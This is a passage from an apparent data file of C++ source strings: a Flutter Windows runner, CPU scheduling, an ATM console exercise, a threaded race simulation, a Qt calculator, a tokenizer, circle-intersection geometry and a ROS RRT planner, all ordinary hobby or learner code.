star_row = -1;\n                for (int r = 0; r < n; ++r) {\n                    if (star_matrix[r][path.back().second]) {\n                        star_row = r;\n   ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"provider2\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//Priority CPU Job Scheduling Implementation\n\n#include <iostream>\n#include <vector>\n#include <algorithm>\nusing namespace std;\n\nclass Process {\npublic:\n    int pID;\n    int arrivalTime;\n    int burstTime;\n    int priority;       // The priority of the process (lower value means higher priority)\n    int completionTime;\n    int waitingTime;\n    int turnAroundTime;\n\n    // Constructor\n    Process(int pID, int arrivalTime, int burstTime, int priority) {\n        this->pID = pID;\n        this->arrivalTime = arrivalTime;\n        this->burstTime = burstTime;\n        this->priority = priority;\n        this->completionTime = 0;\n        this->waitingTime = 0;\n        this->turnAroundTime = 0;\n    }\n\n    // Display process details\n    void display() const {\n        cout << \"Process ID: \" << pID << \", Arrival Time: \" << arrivalTime\n             << \", Burst Time: \" << burstTime << \", Priority: \" << priority\n             << \", Completion Time: \" << completionTime << \", Waiting Time: \" << waitingTime\n             << \", Turnaround Time: \" << turnAroundTime << endl;\n    }\n};\n\n// Comparator to sort processes by priority first, then arrival time\nbool comparePriority(const Process &a, const Process &b) {\n    if (a.priority == b.priority) {\n        return a.arrivalTime < b.arrivalTime;  // If priority is same, use arrival time (FCFS)\n    }\n    return a.priority < b.priority;  // Lower priority number means higher priority\n}\n\nint main() {\n    int n;\n    cout << \"Enter the Number of Processes for Priority Scheduling: \";\n    cin >> n;\n\n    vector<Process> processes;\n\n    // Input processes\n    for (int i = 0; i < n; i++) {\n        int pID, arrivalTime, burstTime, priority;\n        cout << \"Enter pID: \";\n        cin >> pID;\n        cout << \"Enter Arrival Time: \";\n        cin >> arrivalTime;\n        cout << \"Enter Burst Time: \";\n        cin >> burstTime;\n        cout << \"Enter Priority (Lower value means higher priority): \";\n        cin >> priority;\n\n        processes.push_back(Process(pID, arrivalTime, burstTime, priority));\n    }\n\n    // Sort processes by priority and arrival time\n    sort(processes.begin(), processes.end(), comparePriority);\n\n    int currentTime = 0;\n    int totalWaitingTime = 0, totalTurnaroundTime = 0;\n\n    // Non-preemptive Priority Scheduling\n    for (int i = 0; i < n; i++) {\n        // Calculate when the CPU will be available for the current process\n        if (currentTime < processes[i].arrivalTime) {\n            currentTime = processes[i].arrivalTime;\n        }\n\n        // Calculate completion, turnaround, and waiting times\n        processes[i].completionTime = currentTime + processes[i].burstTime;\n        processes[i].turnAroundTime = processes[i].completionTime - processes[i].arrivalTime;\n        processes[i].waitingTime = processes[i].turnAroundTime - processes[i].burstTime;\n\n        totalWaitingTime += processes[i].waitingTime;\n        totalTurnaroundTime += processes[i].turnAroundTime;\n\n        currentTime += processes[i].burstTime;  // Update current time\n    }\n\n    // Display process information\n    cout << \"\\nProcess Scheduling Results (Priority Non-Preemptive):\\n\";\n    for (const auto &p : processes) {\n        p.display();\n    }\n\n    // Calculate and display average waiting time and turnaround time\n    double avgWaitingTime = (double)totalWaitingTime / n;\n    double avgTurnAroundTime = (double)totalTurnaroundTime / n;\n\n    cout << \"\\nAverage Waiting Time: \" << avgWaitingTime << endl;\n    cout << \"Average Turnaround Time: \" << avgTurnAroundTime << endl;\n\n    return 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  unsigned int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <rift/reflection/rf_object.hpp>\n#include <stdexcept>\n\nstd::unordered_map<std::string, RFTypeInfo *> &RFObject::getRegistry() {\n    static std::unordered_map<std::string, RFTypeInfo *> s_Registry;\n    return s_Registry;\n}\n\nstd::vector<RFProperty *> RFObject::getProperties() const {\n    return m_Properties;\n}\n\nstd::vector<RFMethod *> RFObject::getMethods() const {\n    return m_Methods;\n}\n\nRFMethod *RFObject::getMethod(std::string_view name) {\n    for (auto method: m_Methods) {\n        if (method->getName() == name) {\n            return method;\n        }\n    }\n\n    return nullptr;\n}\n\nRFProperty *RFObject::getProperty(std::string_view name) {\n    for (auto property: m_Properties) {\n        if (property->getName() == name) {\n            return property;\n        }\n    }\n\n    return nullptr;\n}\n\nRFObject *RFObject::createInstance(std::string_view name) {\n    auto type = getType(name);\n\n    if (type) {\n        return type->createInstance();\n    }\n\n    return nullptr;\n}\n\nRFObject* RFObject::createChild(std::string_view name) {\n    auto itx = createInstance(name);\n\n    if (itx) {\n        itx->m_Parent = this;\n        m_Children.push_back(itx);\n\n        return itx;\n    }\n\n    return nullptr;\n}\n\nRFTypeInfo *RFObject::getType(std::string_view name) {\n    const auto &registry = getRegistry();\n    auto it = registry.find(std::string(name));\n\n    if (it != registry.end()) {\n        return it->second;\n    }\n\n    throw std::runtime_error(\"Type not found\");\n}",
    "// Project - ATM System\r\n//_______________________________________________________________________________\r\n\r\n#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <vector>\r\n#include <iomanip>\r\n\r\nusing namespace std;\r\n\r\nconst string ClientsFileName = \"Clients.txt\";\r\n\r\nvoid Login();\r\nvoid ShowMainMenu();\r\nvoid ShowQuickWithdrawScreen();\r\nvoid ShoWNormalWithdrawScreen();\r\n\r\nstruct sClient\r\n{\r\n    string AccountNumber;\r\n    string PinCode;\r\n    string Name;\r\n    string Phone;\r\n    double AccountBalance;\r\n    bool MarkForDelete = false;\r\n};\r\n\r\nsClient CurrentClient;\r\n\r\nenum enMainMenuOptions\r\n{\r\n    eQuickWithdraw = 1, eNormalWithdraw = 2,\r\n    eDeposit = 3, eCheckBalance = 4, eExit = 5\r\n};\r\n\r\nvector<string> SplitString(string S1, string Delim)\r\n{\r\n    vector<string> vString;\r\n    short pos = 0;\r\n    string sWord; // define a string variable  \r\n\r\n    // use find() function to get the position of the delimiters  \r\n    while ((pos = S1.find(Delim)) != std::string::npos)\r\n    {\r\n        sWord = S1.substr(0, pos); // store the word   \r\n        if (sWord != \"\")\r\n        {\r\n            vString.push_back(sWord);\r\n        }\r\n\r\n        S1.erase(0, pos + Delim.length());  /* erase() until positon and move to next word. */\r\n    }\r\n\r\n    if (S1 != \"\")\r\n    {\r\n        vString.push_back(S1); // it adds last word of the string.\r\n    }\r\n\r\n    return vString;\r\n\r\n}\r\n\r\nsClient ConvertLineToRecord(string Line, string Seperator = \"#//#\")\r\n{\r\n    sClient Client;\r\n    vector<string> vClientData;\r\n    vClientData = SplitString(Line, Seperator);\r\n\r\n    Client.AccountNumber = vClientData[0];\r\n    Client.PinCode = vClientData[1];\r\n    Client.Name = vClientData[2];\r\n    Client.Phone = vClientData[3];\r\n    Client.AccountBalance = stod(vClientData[4]);//cast string to double\r\n    return Client;\r\n}\r\n\r\nvector <sClient> LoadClientsDataFromFile(string FileName)\r\n{\r\n    vector <sClient> vClients;\r\n    fstream MyFile;\r\n    MyFile.open(FileName, ios::in);//read Mode\r\n\r\n    if (MyFile.is_open())\r\n    {\r\n        string Line;\r\n        sClient Client;\r\n\r\n        while (getline(MyFile, Line))\r\n        {\r\n            Client = ConvertLineToRecord(Line);\r\n            vClients.push_back(Client);\r\n        }\r\n        MyFile.close();\r\n    }\r\n    return vClients;\r\n}\r\n\r\nbool FindClientByAccountNumberAndPinCode(string AccountNumber, string PinCode, sClient& Client) {\r\n\r\n    vector<sClient> vClient = LoadClientsDataFromFile(ClientsFileName);\r\n\r\n    for (sClient& C : vClient)\r\n    {\r\n        if (C.AccountNumber == AccountNumber && C.PinCode == PinCode)\r\n        {\r\n            Client = C;\r\n            return true;\r\n        }\r\n    }\r\n    return false;\r\n\r\n}\r\n\r\nbool LoadClientInfo(string AccountNumber, string PinCode) {\r\n\r\n    if (FindClientByAccountNumberAndPinCode(AccountNumber, PinCode, CurrentClient))\r\n        return true;\r\n    else\r\n        return false;\r\n}\r\n\r\nshort ReadMainMenuOption()\r\n{\r\n    cout << \"Choose what do you want to do? [1 to 5]? \";\r\n    short Choice = 0;\r\n    cin >> Choice;\r\n\r\n    return Choice;\r\n}\r\n\r\nshort ReadQucikWithdrawOption()\r\n{\r\n    short Choice = 0;\r\n    while (Choice < 1 || Choice > 9)\r\n    {\r\n        cout << \"\\nChoose what to do from [1] to [9] ? \";\r\n        cin >> Choice;\r\n    }\r\n    return Choice;\r\n\r\n}\r\n\r\nvoid GoBackToMainMenu()\r\n{\r\n    cout << \"\\n\\nPress any key to go back to Main Menu...\";\r\n    system(\"pause>0\");\r\n    ShowMainMenu();\r\n\r\n}\r\n\r\nsClient ConvertLinetoRecord(string Line, string Seperator = \"#//#\")\r\n{\r\n    sClient Client;\r\n    vector<string> vClientData;\r\n    vClientData = SplitString(Line, Seperator);\r\n\r\n    Client.AccountNumber = vClientData[0];\r\n    Client.PinCode = vClientData[1];\r\n    Client.Name = vClientData[2];\r\n    Client.Phone = vClientData[3];\r\n    Client.AccountBalance = stod(vClientData[4]);//cast string to double\r\n    return Client;\r\n}\r\n\r\nvector <sClient> LoadCleintsDataFromFile(string FileName)\r\n{\r\n    vector <sClient> vClients;\r\n    fstream MyFile;\r\n    MyFile.open(FileName, ios::in);//read Mode\r\n\r\n    if (MyFile.is_open())\r\n    {\r\n        string Line;\r\n        sClient Client;\r\n\r\n        while (getline(MyFile, Line))\r\n        {\r\n            Client = ConvertLinetoRecord(Line);\r\n            vClients.push_back(Client);\r\n        }\r\n        MyFile.close();\r\n    }\r\n    return vClients;\r\n}\r\n\r\nstring ConvertRecordToLine(sClient Client, string Seperator = \"#//#\")\r\n{\r\n\r\n    string stClientRecord = \"\";\r\n    stClientRecord += Client.AccountNumber + Seperator;\r\n    stClientRecord += Client.PinCode + Seperator;\r\n    stClientRecord += Client.Name + Seperator;\r\n    stClientRecord += Client.Phone + Seperator;\r\n    stClientRecord += to_string(Client.AccountBalance);\r\n    return stClientRecord;\r\n}\r\n\r\nvector <sClient> SaveCleintsDataToFile(string FileName, vector <sClient> vClients)\r\n{\r\n    fstream MyFile;\r\n    MyFile.open(FileName, ios::out);//overwrite\r\n\r\n    string DataLine;\r\n\r\n    if (MyFile.is_open())\r\n    {\r\n        for (sClient C : vClients)\r\n        {\r\n\r\n            if (C.MarkForDelete == false)\r\n        ",
    "#include <iostream>\n#include <thread>\n#include <vector>\n#include <mutex>\n#include <cstdlib>  \n#include <chrono>\n#include <iomanip>\n\nusing namespace std;\n\nmutex mtx;\nint lugar_actual = 1;//variable para seguir el lugar del auto\nvector<int> resultados; // Vector para almacenar el orden de los autos que terminan\n\nvoid carreraAuto(int id_auto, int distancia_total) {\n    int distancia_recorrida = 0;//Inicia en 0 la distancia recorrida por el auto\n\n    while (distancia_recorrida < distancia_total) {\n        int movimiento = rand() % 10 + 1;//se genera un movimiento aleatorio entre 1 y 10 metros\n        distancia_recorrida += movimiento;//se incremneta la distancia recorrida por el auto\n         //comprueba que la distancia recorrida no pase a la distancia total\n        if (distancia_recorrida > distancia_total) {\n            distancia_recorrida = distancia_total;\n        }\n\n        {\n            lock_guard<mutex> lock(mtx);\n           //imprime el progreso de la carrera de cada auto\n            cout << \"Auto \" << id_auto << \" avanza \" << movimiento << \" metros (total: \" << distancia_recorrida << \" metros)\" << endl;\n        }\n\n        this_thread::sleep_for(chrono::milliseconds(100 + rand() % 200));\n    }\n\n    {\n        lock_guard<mutex> lock(mtx);\n        cout << \"Auto \" << id_auto << \" termina la carrera en el lugar \" << lugar_actual++ << \"!\" << endl;\n        resultados.push_back(id_auto); // Guardar el ID del auto en el orden de llegada\n    }\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 3) {\n        cerr << \"Uso: \" << argv[0] << \" <distancia_total> <numero_autos>\" << endl;\n        return 1;\n    }\n\n    int distancia_total = stoi(argv[1]);\n    int num_autos = stoi(argv[2]);\n\n    srand(time(0));\n\n    cout << \"----------------------------------------\" << endl;\n    cout << \"Distancia total carrera: \" << distancia_total << \" metros\" << endl;\n    cout << \"----------------------------------------\" << endl;\n\n    vector<thread> autos;//vector para guardar los hilos de los autos\n   //crea y lanza los hilos para cada uno de los autos\n    for (int i = 0; i < num_autos; ++i) {\n        autos.emplace_back(carreraAuto, i, distancia_total);\n    }\n    //espera a que todos los hilos terminen\n    for (auto& auto_hilo : autos) {\n        auto_hilo.join();\n    }\n    \n    cout << \"----------------------------------------\" << endl;\n    cout << \"Lugar  Auto\" << endl;\n\n    // Imprimir el resultado en el orden en que los autos terminaron\n    for (int i = 0; i < resultados.size(); ++i) {\n        cout << (i + 1) << \"      \" << \"Auto\" << resultados[i] << endl;  // Usamos el vector resultados para mostrar el orden correcto\n    }\n\n    cout << \"----------------------------------------\" << endl;\n\n    cout << \"\u00a1Carrera finalizada!\" << endl;\n    return 0;\n}\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include <vector>\n#include <QDebug>\nint curr_val = 0;\nstd::vector<QString> CALC;\nUi::MainWindow* ui_;\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui_ = ui;\n    ui->setupUi(this);\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n// Assuming CALC is a std::vector<QString> and curr_val is a valid index\n\nvoid addVal(QString v) {\n    if (curr_val >= 0 && static_cast<size_t>(curr_val) < CALC.size()) {\n        // If the element at CALC[curr_val] is empty, create a new element\n        if (CALC[curr_val].isEmpty()) {\n            CALC[curr_val] = v;\n        } else {\n            // If the element is not empty, append to it\n            CALC[curr_val] += v;\n        }\n    } else {\n        // Handle invalid index or other conditions\n        // You may want to throw an exception, return an error code, or take appropriate action.\n    }\n}\n\nvoid modVal(char v) {\n    // Increment curr_val\n    curr_val++;\n\n    // Check if curr_val is within the bounds of CALC\n    if (curr_val < int(CALC.size())) {\n        // Assign QString representation of char to CALC[curr_val]\n        CALC[curr_val] = QString(v);\n\n        // Increment curr_val again\n        curr_val++;\n    } else {\n        // Handle the case where curr_val is out of bounds\n        // You may want to throw an exception, return an error code, or take appropriate action.\n    }\n}\nint calculateResult() {\n    int result = 0;\n    ui_->DISP_RESULT->setPlainText(\"Fuck\");\n    for (int i = 0; i < CALC.size(); i +2) {\n        qDebug() << \"Debugging information: \" << CALC[i];\n\n        if (i + 1 < CALC.size()) {\n            bool conversionOk;\n            int operand = CALC[i + 1].toInt(&conversionOk);\n\n            if (!conversionOk) {\n                // Handle error: unable to convert the operand to an int\n                ui_->DISP_RESULT->setPlainText(\"Error: Invalid operand at index \" + QString::number(i + 1));\n                qDebug() << \"Error: Invalid operand at index \" + QString::number(i + 1);\n                return 0;  // or another suitable error code\n            }\n\n            if (CALC[i] == \"A\") {\n                result += operand;\n            } else if (CALC[i] == \"S\") {\n                result -= operand;\n            } else if (CALC[i] == \"M\") {\n                result *= operand;\n            } else if (CALC[i] == \"D\") {\n                if (operand != 0) {\n                    result /= operand;\n                } else {\n                    // Handle error: division by zero\n                    ui_->DISP_RESULT->setPlainText(\"Error: Division by zero at index \" + QString::number(i + 1));\n                    qDebug() << \"Error: Division by zero at index \" + QString::number(i + 1);\n                    return 0;  // or another suitable error code\n                }\n            } else {\n                // Handle error: unknown operation\n                ui_->DISP_RESULT->setPlainText(\"Error: Unknown operation at index \" + QString::number(i));\n                qDebug() << \"Error: Unknown operation at index \" + QString::number(i);\n                return 0;  // or another suitable error code\n            }\n        } else {\n            // Handle error: missing operand for the last operation\n            ui_->DISP_RESULT->setPlainText(\"Error: Missing operand for the operation at index \" + QString::number(i));\n            qDebug() << \"Error: Missing operand for the operation at index \" + QString::number(i);\n            return 0;  // or another suitable error code\n        }\n    }\n\n    // Clear any previous error message if there was one\n    ui_->DISP_RESULT->setPlainText(\"\");\n\n    return result;\n}\nvoid MainWindow::on_META_CLEAR_clicked()\n{\n    ui->DISP_RESULT->clear();\n    CALC.clear();\n    curr_val = 0;\n}\n\nvoid MainWindow::on_SEVEN_clicked()\n{\n    addVal(\"7\");\n    ui->DISP_RESULT->setPlainText(ui->DISP_RESULT->toPlainText() + \"7\");\n}\n\nvoid MainWindow::on_EIGHT_clicked()\n{\n   addVal(\"8\");\n   ui->DISP_RESULT->setPlainText(ui->DISP_RESULT->toPlainText() + \"8\");\n}\n\nvoid MainWindow::on_NINE_clicked()\n{\n   addVal(\"9\");\n   ui->DISP_RESULT->setPlainText(ui->DISP_RESULT->toPlainText() + \"9\");\n}\n\nvoid MainWindow::on_FOUR_clicked()\n{\n   addVal(\"4\");\n   ui->DISP_RESULT->setPlainText(ui->DISP_RESULT->toPlainText() + \"4\");\n}\n\nvoid MainWindow::on_FIVE_clicked()\n{\n   addVal(\"5\");\n   ui->DISP_RESULT->setPlainText(ui->DISP_RESULT->toPlainText() + \"5\");\n}\n\nvoid MainWindow::on_SIX_clicked()\n{\n   addVal(\"6\");\n   ui->DISP_RESULT->setPlainText(ui->DISP_RESULT->toPlainText() + \"6\");\n}\n\nvoid MainWindow::on_THREE_clicked()\n{\n   addVal(\"3\");\n   ui->DISP_RESULT->setPlainText(ui->DISP_RESULT->toPlainText() + \"3\");\n}\n\nvoid MainWindow::on_TWO_clicked()\n{\n   addVal(\"2\");\n   ui->DISP_RESULT->setPlainText(ui->DISP_RESULT->toPlainText() + \"2\");\n}\n\nvoid MainWindow::on_ONE_clicked()\n{\n   addVal(\"1\");\n   ui->DISP_RESULT->setPlainText(ui->DISP_RESULT->toPlainText() + \"1\");\n}\n\nvoid MainWindow::on_ZERO_clicked()\n{\n   addVal(\"0\");\n",
    "#include \"main.h\"\r\n#include \"parser.h\"\r\n\r\nconst char* tokentext[] = {\r\n    \"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\r\n    \"T_NL\",\r\n    \"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\r\n\r\n    \"T_NOT\",\"\\\"\",\"T_IMPORT\",\"T_THIS\",\"T_MOD\",\"T_AND\",\"'\",\"T_ORB\",\"T_CRB\",\"T_MUL\",\"T_ADD\",\"T_COMMA\",\"T_SUB\",\"T_DOT\",\"T_DIV\",\r\n\r\n\t\"T_IDENTIFIER\",\"T_NUMBER\",\"T_FLOAT\",\"T_STRING\",\"T_MSTRING\",\"5\",\"6\",\"7\",\"8\",\"9\",\r\n\r\n    \"T_COLON\",\"T_SCOLON\",\"T_LESS\",\"T_EQ\",\"T_GREAT\",\"T_TERNARY\",\"T_AT\",\r\n\r\n\t\"T_ADDEQ\",\"B\",\"C\",\"T_DIVEQ\",\"T_EQEQ\",\"F\",\"T_GREATEQ\",\"H\",\"I\",\"J\",\"K\",\"T_LESSEQ\",\"T_MULEQ\",\"T_ANDEQ\",\"T_MODEQ\",\"P\",\"Q\",\"T_OREQ\",\"T_SUBEQ\",\"T_NOTEQ\",\"U\",\"V\",\"W\",\"T_XOREQ\",\"Y\",\"Z\",\r\n\r\n    \"T_OSB\",\"T_CATNL\",\"T_CSB\",\"T_XOR\",\"_\",\"`\",\r\n\r\n\t\"a\",\"T_BREAK\",\"T_CONTINUE\",\"d\",\"T_ELSE\",\"T_FOR\",\"g\",\"h\",\"T_IF\",\"j\",\"k\",\"T_ELIF\",\"m\",\"n\",\"o\",\"p\",\"q\",\"T_RETURN\",\"s\",\"t\",\"u\",\"v\",\"T_WHILE\",\"x\",\"y\",\"z\",\r\n\r\n    \"T_OCB\",\"T_OR\",\"T_CCB\",\"T_EXTERNAL\"\r\n};\r\n\r\nconst TOKENTYPE types1[] = { T_ADD, T_SUB, T_MUL, T_DIV, T_MOD, T_AND, T_OR, T_LESS, T_GREAT, T_XOR, T_NOT, T_EQ };\r\nconst TOKENTYPE doubles[12] = { T_ADDEQ, T_SUBEQ, T_MULEQ, T_DIVEQ, T_MODEQ, T_ANDEQ, T_OREQ, T_LESSEQ, T_GREATEQ, T_XOREQ, T_NOTEQ, T_EQEQ };\r\nconst TOKENTYPE types2[] = { T_ORB, T_CRB, T_OCB, T_CCB, T_OSB, T_CSB, T_DOT, T_COMMA, T_COLON, T_SCOLON, T_IMPORT, T_TERNARY, T_AT, T_THIS, T_CATNL, T_EXTERNAL };\r\n\r\nbool isID(const char c) {\r\n    if (c >= '\\0' && c <= '/')\r\n        return false;\r\n    if (c >= ':' && c <= '@')\r\n\t\treturn false;\r\n\tif (c >= '[' && c <= '^')\r\n\t\treturn false;\r\n    if (c >= '{' && c <= 0x7F)\r\n        return false;\r\n    return true;\r\n}\r\n\r\nvoid pushtoken(linked_list<token_list>& list, token_list* item) {\r\n    if (list.begin == nullptr) {\r\n        list.begin = list.end = item;\r\n    } else {\r\n        list.end->next = item;\r\n        list.end = item;\r\n    }\r\n}\r\n\r\nvoid reverse() {\r\n    /*\r\n    ptr = tokens;\r\n    tokens = nullptr;\r\n    while (ptr) {\r\n        token_list* next = ptr->next;\r\n        ptr->next = tokens;\r\n        tokens = ptr;\r\n        ptr = next;\r\n    }\r\n    return tokens;\r\n    */\r\n}\r\n\r\ntoken_list* next(char*& ptr, const char* end, const char*& line) {\r\n    switch (*ptr) {\r\n    case ' ': case '\\t': case '\\r': case '\\0': return nullptr;\r\n    case '\\n': {\r\n        token_list* t = new token_list;\r\n        t->t = { T_NL, ptr, ptr + 1, line };\r\n        t->next = nullptr;\r\n        *ptr = '\\0';\r\n        line = ptr + 1;\r\n        return t;\r\n    }\r\n    case '\"': {\r\n        ptr++; // skip quote\r\n        const char* start = ptr;\r\n        while (ptr < end && *ptr != '\"')\r\n            ptr++;\r\n        if (ptr == end)\r\n            ptrError(line, start, \"reached end of file\");\r\n        //printf(\"size of multiline string: %i\\n\", ptr - start);\r\n        token_list* t = new token_list;\r\n        t->t = { T_MSTRING, start, ptr, line };\r\n        t->next = nullptr;\r\n        return t;\r\n    }\r\n    case '\\'': {\r\n        ptr++; // skip quote\r\n        const char* start = ptr;\r\n        while (ptr < end && *ptr != '\\'' && *ptr != '\\n')\r\n            ptr++;\r\n        if (ptr == end)\r\n            ptrError(line, start, \"reached end of file\");\r\n        if (*ptr != '\\'')\r\n            ptrError(line, start, \"missing end of string\");\r\n        //printf(\"size of string: %i\\n\", ptr - start);\r\n\t\ttoken_list* t = new token_list;\r\n\t\tt->t = { T_STRING, start, ptr, line };\r\n\t\tt->next = nullptr;\r\n\t\treturn t;\r\n    }\r\n    case '0': case '1': case '2': case '3': case '4': case '5': case '6': case '7': case '8': case '9': {\r\n        char* start = ptr++;\r\n        bool isfloat = false;\r\n\r\n        if (ptr < end) {\r\n            const char second = *(ptr++);\r\n            switch (second) {\r\n            case 'b': case 'B':\r\n                while (ptr < end && (*ptr == '_' || *ptr == '0' || *ptr == '1')) ptr++;\r\n                break;\r\n            case 'o': case 'O':\r\n                while (ptr < end && (*ptr == '_' || (*ptr >= '0' && *ptr <= '7'))) ptr++;\r\n                break;\r\n            case 'x': case 'X':\r\n                while (ptr < end && (*ptr == '_' || isxdigit(*ptr))) ptr++;\r\n                break;\r\n            default:\r\n                for (ptr = start; ptr < end && (*ptr == '_' || *ptr == '.' || isdigit(*ptr)); ptr++) {\r\n                    if (*ptr == '.') {\r\n                        if (isfloat)\r\n                            ptrError(line, start, \"more than one decimal point in float\");\r\n                        isfloat = true;\r\n                    }\r\n                }\r\n                break;\r\n            }\r\n        }\r\n        token_list* t = new token_list;\r\n        t->next = nullptr;\r\n\r\n        if (isfloat) {\r\n\t\t\tt->t = { T_FLOAT, start, ptr, line };\r\n        } else {\r\n\t\t\tt->t = { T_NUMBER, start, ptr, line };\r\n        }\r\n\r\n        ptr--;\r\n        return t;\r\n    }\r\n    case '+': case '-': case '*': case '/': case '%': case '&':\r\n    case '|': case '<': case '>': case '^': case '!': case '=': {\r\n        const char* str = \"+-*/%&|<>^!=\";\r\n        const int index = strchr(str, ptr[0]) - str;\r\n        if ((ptr + 1) == end ||",
    "#include <iostream>\n#include <cmath>\n#include <vector>\n#include <utility>\n\nusing namespace std;\n\n// Fonction pour calculer les points d'intersection de deux cercles\nvector<pair<double, double>> findIntersections(double xA, double yA, double rA, double xB, double yB, double rB) {\n    vector<pair<double, double>> intersections;\n\n    // Calculer la distance entre les centres des cercles\n    double d = sqrt(pow(xB - xA, 2) + pow(yB - yA, 2));\n\n    // V\u00e9rifier si les cercles se croisent\n    if (d > rA + rB || d < abs(rA - rB)) {\n        // Pas d'intersection\n        return intersections;\n    }\n\n    // Calcul des points d'intersection\n    double a = (pow(rA, 2) - pow(rB, 2) + pow(d, 2)) / (2 * d);\n    double h = sqrt(pow(rA, 2) - pow(a, 2));\n\n    // Point P0, le point sur la ligne entre les centres\n    double Px = xA + a * (xB - xA) / d;\n    double Py = yA + a * (yB - yA) / d;\n\n    // Points d'intersection\n    double intersection1_x = Px + h * (yB - yA) / d;\n    double intersection1_y = Py - h * (xB - xA) / d;\n\n    double intersection2_x = Px - h * (yB - yA) / d;\n    double intersection2_y = Py + h * (xB - xA) / d;\n\n    intersections.push_back(make_pair(intersection1_x, intersection1_y));\n    intersections.push_back(make_pair(intersection2_x, intersection2_y));\n\n    return intersections;\n}\n\nint main() {\n    // Positions des points de r\u00e9f\u00e9rence\n    double xA = 0, yA = 0 ; // Point A\n    \n    double xB = 4, yB = 0; // Point B\n\n    // Distances mesur\u00e9es\n    double dA = 3 ; // Distance du point A\n    double dB = 3; // Distance du point B\n\n    // Calculer les intersections\n    vector<pair<double, double>> intersections = findIntersections(xA, yA, dA, xB, yB, dB);\n\n    // Afficher les r\u00e9sultats\n    if (intersections.empty()) {\n        cout << \"Pas d'intersection trouv\u00e9e.\" << endl;\n    }\n    else {\n        cout << \"Points d'intersection : \" << endl;\n        for (const auto& point : intersections) {\n            cout << \"(\" << point.first << \", \" << point.second << \")\" << endl;\n        }\n    }\n\n    return 0;\n}\r\n",
    "#include <pluginlib/class_list_macros.h>\n#include \"rrt.hpp\"\n\n// register this planner as a BaseGlobalPlanner plugin\nPLUGINLIB_EXPORT_CLASS(global_planner::RRTGlobalPlanner, nav_core::BaseGlobalPlanner)\n\nusing namespace std;\n\n// Default Constructor\nnamespace global_planner\n{\nRRTGlobalPlanner::RRTGlobalPlanner()\n{\n}\n\nRRTGlobalPlanner::RRTGlobalPlanner(std::string name, costmap_2d::Costmap2DROS* costmap_ros)\n{\n  initialize(name, costmap_ros);\n}\n\nvoid RRTGlobalPlanner::initialize(std::string name, costmap_2d::Costmap2DROS* costmap_ros)\n{\n  if (!initialized_)\n  {\n    ROS_INFO(\"Initializing RRTGlobalPlanner.\");\n    name_ = name;\n    costmap_ros_ = costmap_ros;\n    costmap_ = costmap_ros_->getCostmap();\n    footprint = costmap_ros_->getRobotFootprint();  // footprint is padded by footprint_padding rosparam\n    robot_radius = getRobotRadius(footprint);\n\n    ros::NodeHandle nh(\"~/\" + name);\n    // Retrieve RRT parameters (or set to default values)\n    nh.param(\"goal_tol\", goal_tol, 0.05);\n    nh.param(\"K_in\", K_in, 4000);\n  